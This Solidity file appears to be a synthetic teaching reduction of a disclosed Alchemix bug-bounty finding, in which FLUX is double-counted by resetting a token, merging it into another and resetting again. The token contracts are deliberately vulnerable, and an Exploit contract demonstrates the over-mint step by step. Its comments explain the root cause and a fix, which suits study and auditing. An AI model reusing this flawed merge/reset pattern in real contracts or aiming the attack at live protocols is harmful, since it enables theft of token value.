// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — Malicious user can mint unlimited FLUX tokens
    (Immunefi, MahdiKarimi, finding #38179)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: Voter::reset(tokenId) adds the tokenId's CURRENT
    claimableFlux(tokenId) (proportional to its CURRENT locked value) to its
    unclaimed FLUX balance, and has no per-epoch "already reset" guard.
    VotingEscrow::merge(id1, id2) transfers id1's locked value AND unclaimed
    FLUX into id2, then burns id1 -- but does NOT prevent id2 from being
    reset() again afterward. So: reset(id1) claims id1's flux at its
    ORIGINAL value; merge(id1, id2) folds id1's value into id2; reset(id2)
    AGAIN claims flux for id2's NEW (inflated) value -- which now includes
    id1's original value a SECOND time, even though flux for that exact
    value was already claimed in the first reset(id1) call.
//////////////////////////////////////////////////////////////////////////*/

contract FluxToken {
    mapping(uint256 => uint256) public unclaimedFlux;

    function accrue(uint256 tokenId, uint256 amount) external {
        unclaimedFlux[tokenId] += amount;
    }

    /// @dev Test helper: moves tokenId1's unclaimed flux into tokenId2 (part
    ///      of the reduced merge()), zeroing tokenId1's.
    function transferUnclaimed(uint256 fromId, uint256 toId) external {
        unclaimedFlux[toId] += unclaimedFlux[fromId];
        unclaimedFlux[fromId] = 0;
    }
}

/// @notice Reduced VotingEscrow + Voter surface needed to demonstrate the
///         double-count. `value[tokenId]` stands in for locked BPT value;
///         `claimableFlux` is a flat rate per unit of CURRENT locked value.
contract VotingEscrow {
    FluxToken public immutable FLUX;
    uint256 public constant FLUX_PER_UNIT = 1; // 1:1 flat rate for a clean demo
    mapping(uint256 => uint256) public value;
    mapping(uint256 => address) public owner;
    uint256 public nextTokenId = 1;

    constructor(FluxToken flux) {
        FLUX = flux;
    }

    function createLock(uint256 _value) external returns (uint256 tokenId) {
        tokenId = nextTokenId++;
        value[tokenId] = _value;
        owner[tokenId] = msg.sender;
    }

    /// @notice src/VotingEscrow.sol::claimableFlux (reduced): proportional to
    ///         the tokenId's CURRENT locked value, recomputed fresh every call.
    function claimableFlux(uint256 tokenId) public view returns (uint256) {
        return value[tokenId] * FLUX_PER_UNIT;
    }

    /// @notice src/VotingEscrow.sol::merge (reduced): folds tokenId1's value
    ///         AND unclaimed flux into tokenId2, then burns tokenId1.
    function merge(uint256 tokenId1, uint256 tokenId2) external {
        require(owner[tokenId1] == msg.sender && owner[tokenId2] == msg.sender, "not owner");

        // @> VULN: tokenId1's locked value is folded into tokenId2 BEFORE
        //          tokenId2's flux is claimed again. Nothing marks tokenId2
        //          as "already reset this epoch" from tokenId1's merged-in
        //          value, so a subsequent reset(tokenId2) recomputes
        //          claimableFlux(tokenId2) off the INFLATED value and
        //          double-counts flux tokenId1 already claimed.
        value[tokenId2] += value[tokenId1];
        FLUX.transferUnclaimed(tokenId1, tokenId2);
        value[tokenId1] = 0;
        owner[tokenId1] = address(0);
        // FIX: block reset() on tokenId2 in the SAME epoch that value was
        //      merged into it from an already-reset tokenId1, or snapshot
        //      claimableFlux at merge time and permanently exclude the
        //      merged-in value from tokenId2's future claimableFlux base.
    }

    /// @notice src/Voter.sol::reset (reduced): adds the tokenId's CURRENT
    ///         claimableFlux to its unclaimed balance. No per-epoch guard
    ///         prevents calling this more than once for the same tokenId.
    function reset(uint256 tokenId) external {
        require(owner[tokenId] == msg.sender, "not owner");
        FLUX.accrue(tokenId, claimableFlux(tokenId));
    }
}

contract Exploit {
    FluxToken public flux;
    VotingEscrow public ve;

    uint256 public tokenId1;
    uint256 public tokenId2;

    constructor() {
        flux = new FluxToken();
        ve = new VotingEscrow(flux);
    }

    function run() external {
        // Create two locks: a large one (100) and a small one (1).
        tokenId1 = ve.createLock(100 ether);
        tokenId2 = ve.createLock(1 ether);

        uint256 token1Flux = ve.claimableFlux(tokenId1); // 100
        uint256 token2Flux = ve.claimableFlux(tokenId2); // 1
        uint256 totalClaimable = token1Flux + token2Flux; // 101 -- the FAIR total for this epoch

        // Step 1: reset tokenId1 -- claims its 100 flux into its unclaimed balance.
        ve.reset(tokenId1);
        require(flux.unclaimedFlux(tokenId1) == token1Flux, "sanity: tokenId1 flux claimed");

        // Step 2: merge tokenId1 into tokenId2. tokenId2's value inflates to
        // 101, and it inherits tokenId1's already-claimed 100 unclaimed flux.
        ve.merge(tokenId1, tokenId2);
        require(ve.value(tokenId2) == 101 ether, "sanity: tokenId2 value inflated by the merge");
        require(flux.unclaimedFlux(tokenId2) == token1Flux, "sanity: tokenId2 inherited tokenId1's already-claimed flux");

        // Step 3 (HARM): reset tokenId2 AGAIN. claimableFlux(tokenId2) is now
        // recomputed off the INFLATED value (101), double-counting the 100
        // units that were tokenId1's -- flux already claimed in Step 1.
        ve.reset(tokenId2);
        uint256 finalUnclaimed = flux.unclaimedFlux(tokenId2);

        // HARM confirmed: the user minted MORE flux than the fair total for
        // this epoch's locked value, exactly matching the finding's own
        // formula: claimed = 2*token1Flux + token2Flux.
        require(finalUnclaimed > totalClaimable, "harm not demonstrated: unclaimed flux should exceed the fair total claimable");
        uint256 expectedDoubleCount = 2 * token1Flux + token2Flux; // 201
        require(finalUnclaimed == expectedDoubleCount, "harm not demonstrated: exact double-count formula should match");
    }
}
